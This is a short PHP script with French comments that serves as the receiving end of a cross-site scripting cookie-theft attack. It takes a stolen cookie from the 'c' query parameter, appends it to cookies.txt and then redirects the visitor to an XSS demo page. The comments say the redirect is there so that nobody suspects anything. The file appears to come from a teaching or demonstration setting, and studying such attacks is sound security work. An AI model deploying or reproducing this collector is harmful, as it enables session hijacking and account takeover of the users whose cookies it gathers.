<?php
$cookie = $_GET["c"]; // on reconnaît c en variable GET
if($cookie)
{
 $fp = fopen("cookies.txt","a"); // On ouvre cookies.txt en edition 
 //(il est créé si il n’existe pas)
 fputs($fp,$cookie . "\r\n"); // On écrit le contenu du cookie sur une nouvelle ligne
 fclose($fp); // On ferme le fichier cookies.txt
 /* FAIRE UNE REDIRECTION JAVASCRIPT CI-DESSOUS POUR QU’ON SE DOUTE
DE RIEN */
}
?>
<script>
location.replace("https://www.veilletechnobts.fr/Vue/indexXSS.php");
</script>